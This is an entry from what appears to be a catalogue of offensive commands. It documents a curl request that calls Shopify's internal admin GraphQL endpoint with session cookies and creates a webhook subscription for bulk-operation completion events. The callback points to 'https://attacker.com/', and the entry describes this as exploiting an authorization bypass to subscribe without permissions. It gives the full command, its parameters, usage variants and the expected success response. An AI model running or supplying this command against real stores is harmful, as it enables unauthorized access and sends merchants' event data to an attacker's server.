---
id: cmd-uuid-1
data: >-
  curl -X POST
  'https://yourstore.myshopify.com/admin/internal/web/graphql/core?operation=PageStaff'
  -H 'Content-Type: application/json' -H 'Cookie: _shopify_s=session;
  _shopify_y=session' -d '{"operationName": "webhookSubscriptionCreate",
  "variables": {"topic": "BULK_OPERATIONS_FINISH", "webhookSubscription":
  {"callbackUrl": "https://attacker.com/"}}, "query": "mutation
  webhookSubscriptionCreate($topic: WebhookSubscriptionTopic!,
  $webhookSubscription: WebhookSubscriptionInput!) {
  webhookSubscriptionCreate(topic: $topic, webhookSubscription:
  $webhookSubscription) { userErrors { field message } webhookSubscription { id
  } } }"}'
tags:
  - graphql
  - webhook
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.522Z'
verified: false
validated: true
submitted: true
---
# shopify-graphql-webhooksubscriptioncreate

## Command

```bash
curl -X POST 'https://yourstore.myshopify.com/admin/internal/web/graphql/core?operation=PageStaff' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: _shopify_s=session; _shopify_y=session' \
  -d '{"operationName": "webhookSubscriptionCreate", "variables": {"topic": "BULK_OPERATIONS_FINISH", "webhookSubscription": {"callbackUrl": "https://attacker.com/"}}, "query": "mutation webhookSubscriptionCreate($topic: WebhookSubscriptionTopic!, $webhookSubscription: WebhookSubscriptionInput!) { webhookSubscriptionCreate(topic: $topic, webhookSubscription: $webhookSubscription) { userErrors { field message } webhookSubscription { id } } }"}'
```

## Description

GraphQL mutation to create a webhook subscription for the BULK_OPERATIONS_FINISH topic in Shopify's admin API, exploiting authorization bypass to subscribe without permissions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--topic` | Webhook topic (e.g., BULK_OPERATIONS_FINISH) | Yes |
| `callbackUrl` | Attacker-controlled URL for notifications | Yes |
| `Cookie` | Session cookies for authentication | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://shop.myshopify.com/admin/internal/web/graphql/core?operation=PageStaff' -H 'Content-Type: application/json' -H 'Cookie: session' -d '{...payload...}'
```

### Advanced Usage

```bash
# With additional headers for X-Shopify-Access-Token if using API key
curl -X POST ... -H 'X-Shopify-Access-Token: token' -d '{...}'
```

## Expected Output

JSON response: {"data":{"webhookSubscriptionCreate":{"webhookSubscription":{"id":"gid://..."},"userErrors":[]}}} on success, indicating webhook created.

## Related

- [[procedures/Create-Unauthorized-Webhook-Subscription-for-BULK-OPERATIONS-FINISH]]
